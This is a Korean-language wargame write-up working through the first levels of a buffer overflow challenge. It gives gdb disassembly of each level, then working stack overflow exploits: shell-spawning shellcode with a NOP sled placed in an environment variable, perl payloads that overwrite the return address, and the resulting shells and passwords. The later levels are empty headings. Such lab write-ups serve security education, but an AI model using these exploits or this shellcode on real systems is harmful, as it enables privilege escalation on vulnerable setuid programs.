Wargame
=======
## 들어가기전에
lv0 비밀번호 : lv0   

## lv 0
gdb로 lv1이 무슨 프로그램인지 확인해보자.   
```pwndbg> disass main   
Dump of assembler code for function main:   
   0x08048430 <+0>:	push   ebp   
   0x08048431 <+1>:	mov    ebp,esp   
   0x08048433 <+3>:	sub    esp,0x100   
   0x08048439 <+9>:	cmp    DWORD PTR [ebp+0x8],0x1    
   0x0804843d <+13>:	jg     0x8048456 <main+38>   
   0x0804843f <+15>:	push   0x80484e0   
   0x08048444 <+20>:	call   0x8048350 <printf@plt>   
   0x08048449 <+25>:	add    esp,0x4   
   0x0804844c <+28>:	push   0x0   
   0x0804844e <+30>:	call   0x8048360 <exit@plt>   
   0x08048453 <+35>:	add    esp,0x4   
   0x08048456 <+38>:	mov    eax,DWORD PTR [ebp+0xc]   
   0x08048459 <+41>:	add    eax,0x4   
   0x0804845c <+44>:	mov    edx,DWORD PTR [eax]   
   0x0804845e <+46>:	push   edx   
   0x0804845f <+47>:	lea    eax,[ebp-0x100]   
   0x08048465 <+53>:	push   eax   
   0x08048466 <+54>:	call   0x8048370 <strcpy@plt>   
   0x0804846b <+59>:	add    esp,0x8   
   0x0804846e <+62>:	lea    eax,[ebp-0x100]    
   0x08048474 <+68>:	push   eax   
   0x08048475 <+69>:	push   0x80484ec   
   0x0804847a <+74>:	call   0x8048350 <printf@plt>   
   0x0804847f <+79>:	add    esp,0x8   
   0x08048482 <+82>:	leave   
   0x08048483 <+83>:	ret   
```   
0x0804845f <+47>:	lea    eax,[ebp-0x100]   
이 부분을 보면 strcpy로 256바이트만큼의 문자열을 담을 수 있다.  

즉 ret부분까지 덮기위해서는 8바이트가 더 필요하다.  
따라서 260바이트 만큼 쓰레기 값을 담아주고 나머지 4바이트에 원하는 주소값을 넣어준다.   

```
`export SHELLCODE=`perl -e 'print "\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
```   
또한 공격을 위한 쉘코드는 위처럼 export로 환경변수를 만들고 그 안에다가 nop값과 함께 넣어준다.   
그리고 gdb에서 ```x/2000x $esp```를 통해 알아낸 nop부분의 적당한 주소값을 ret에 넣어준다.   
이렇게 해주면 main이 끝나고 ret을 통해 nop주소로 이동을하며 쉘코드를 실행시키게 된다.

필자가 ret에 넣어줄 주소값은 ```0xffffda7c```이다.

실행결과   
```
./lv1 `perl -e 'print "a"x260, "\x7c\xda\xff\xff"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|���
$ whoami
lv1
$ id
uid=1001(lv1) gid=1000(lv0) groups=1000(lv0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

성공적으로 권한을 얻은것을 확인할 수 있다.

알아낸 lv1 비번 : hello newbie!

## lv 1
gbd로 lv2가 무엇을 하는 프로그램인지 확인해보자. 
```
pwndbg> disass main   
Dump of assembler code for function main:   
   0x08048430 <+0>:	push   ebp   
   0x08048431 <+1>:	mov    ebp,esp   
   0x08048433 <+3>:	sub    esp,0x10   
   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1   
   0x0804843a <+10>:	jg     0x8048453 <main+35>   
   0x0804843c <+12>:	push   0x80484d0   
   0x08048441 <+17>:	call   0x8048350 <printf@plt>    
   0x08048446 <+22>:	add    esp,0x4   
   0x08048449 <+25>:	push   0x0   
   0x0804844b <+27>:	call   0x8048360 <exit@plt>   
   0x08048450 <+32>:	add    esp,0x4   
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]   
   0x08048456 <+38>:	add    eax,0x4   
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]   
   0x0804845b <+43>:	push   edx   
   0x0804845c <+44>:	lea    eax,[ebp-0x10]   
   0x0804845f <+47>:	push   eax   
   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>   
   0x08048465 <+53>:	add    esp,0x8   
   0x08048468 <+56>:	lea    eax,[ebp-0x10]   
   0x0804846b <+59>:	push   eax   
   0x0804846c <+60>:	push   0x80484dc   
   0x08048471 <+65>:	call   0x8048350 <printf@plt>   
   0x08048476 <+70>:	add    esp,0x8   
   0x08048479 <+73>:	leave   
   0x0804847a <+74>:	ret  
   ```
lv1 프로그램과 크게 다른점은 없다.   

0x08048468 <+56>:	lea    eax,[ebp-0x10]   
다른점이라고하면 strcpy에 16바이트밖에 못 담는다는 것이고  
24바이트만에 ret까지 채워넣을 수 있게된다.

따라서 lv1과 같은 방법으로 문제를 풀어주면 된다.

실행결과
```
lv1@ubuntu:~$ ./lv2 `perl -e 'print "a"x20, "\xac\xda\xff\xff"'`
aaaaaaaaaaaaaaaaaaaa����
$ whoami
lv2
$ id
uid=1002(lv2) gid=1001(lv1) groups=1001(lv1)
```

알아낸 lv2 비번 : tooo easy
## lv 2
gdb로 lv3가 무슨 프로그램인지 확인해보자.
```
   0x080483f8 <+0>:	push   ebp
   0x080483f9 <+1>:	mov    ebp,esp
   0x080483fb <+3>:	sub    esp,0x10
   0x080483fe <+6>:	lea    eax,[ebp-0x10]
   0x08048401 <+9>:	push   eax
   0x08048402 <+10>:	call   0x804830c <gets@plt>
   0x08048407 <+15>:	add    esp,0x4
   0x0804840a <+18>:	lea    eax,[ebp-0x10]
   0x0804840d <+21>:	push   eax
   0x0804840e <+22>:	push   0x8048470
   0x08048413 <+27>:	call   0x804833c <printf@plt>
   0x08048418 <+32>:	add    esp,0x8
   0x0804841b <+35>:	leave  
   0x0804841c <+36>:	ret
   ```
lv3는 그 전과는 다르게 strcpy가 아닌 gets함수로 문자를 입력받게된다.   
마찬가지로 16바이트만큼 담을 수 있으며 초과부분은 ebp를 지나 ret까지 침범하게된다.  

그 전 문제들과는 같게 풀어주되 이번에는 ./lv3를 실행시킬때 파이프라인을 이용하자.  
```
lv2@ubuntu:~$ (perl -e 'print "a"x20, "\x8c\xda\xff\xff"';cat) | ./lv3
id
aaaaaaaaaaaaaaaaaaaa����id
id
uid=1003(lv3) gid=1002(lv2) groups=1002(lv2)
```

알아낸 lv3 비번 : i dont like stdin

## lv 3
gdb로 lv4가 무슨 프로그램인지 확인해보자.
```
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x2c
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804850a <+10>:	jg     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048630
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>
   0x08048520 <+32>:	add    esp,0x4
   0x08048523 <+35>:	nop
   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804852b <+43>:	nop
   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
   0x0804853a <+58>:	mov    eax,ds:0x8049750
   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x08048543 <+67>:	jne    0x8048547 <main+71>
   0x08048545 <+69>:	jmp    0x8048587 <main+135>
   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
   0x08048551 <+81>:	mov    eax,ds:0x8049750
   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048559 <+89>:	push   edx
   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
   0x0804855f <+95>:	add    esp,0x4
   0x08048562 <+98>:	mov    eax,eax
   0x08048564 <+100>:	push   eax
   0x08048565 <+101>:	push   0x0
   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
   0x08048571 <+113>:	mov    eax,ds:0x8049750
   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048579 <+121>:	push   edx
   0x0804857a <+122>:	call   0x8048430 <memset@plt>
   0x0804857f <+127>:	add    esp,0xc
   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
   0x08048585 <+133>:	jmp    0x8048530 <main+48>
   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+138>:	add    eax,0x4
   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
   0x0804858f <+143>:	add    edx,0x2f
   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
   0x08048595 <+149>:	je     0x80485b0 <main+176>
   0x08048597 <+151>:	push   0x804863c
   0x0804859c <+156>:	call   0x8048410 <printf@plt>
   0x080485a1 <+161>:	add    esp,0x4
   0x080485a4 <+164>:	push   0x0
   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
   0x080485ab <+171>:	add    esp,0x4
   0x080485ae <+174>:	mov    esi,esi
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	lea    eax,[ebp-0x28]
   0x080485bc <+188>:	push   eax
   0x080485bd <+189>:	call   0x8048440 <strcpy@plt>
   0x080485c2 <+194>:	add    esp,0x8
   0x080485c5 <+197>:	lea    eax,[ebp-0x28]
   0x080485c8 <+200>:	push   eax
   0x080485c9 <+201>:	push   0x8048659
   0x080485ce <+206>:	call   0x8048410 <printf@plt>
   0x080485d3 <+211>:	add    esp,0x8
   0x080485d6 <+214>:	leave  
   0x080485d7 <+215>:	ret 
```
이번에는 환경변수를 초기화시켜 버린다.
그리고 버퍼에 담을 수 있는 공간은 0x28바이트뿐

거기다가 
```0x8048592 <main+146>    cmp    byte ptr [edx], 0xff```
입력된 값의 48번째 자리가 \xff인지 확인하는 코드까지 있다.

그러나 함수의 인자부분은 지우지 않는 것을 확인할 수 있으므로
44바이트의 쓰레기값과 4바이트의 주소값을 넣어 준 후 뒤에 nop와 쉘코드를 넣어준다.

## lv 4
## lv 5
## lv 6
## lv 7
## lv 8
## lv 9
## lv 10
## lv 11
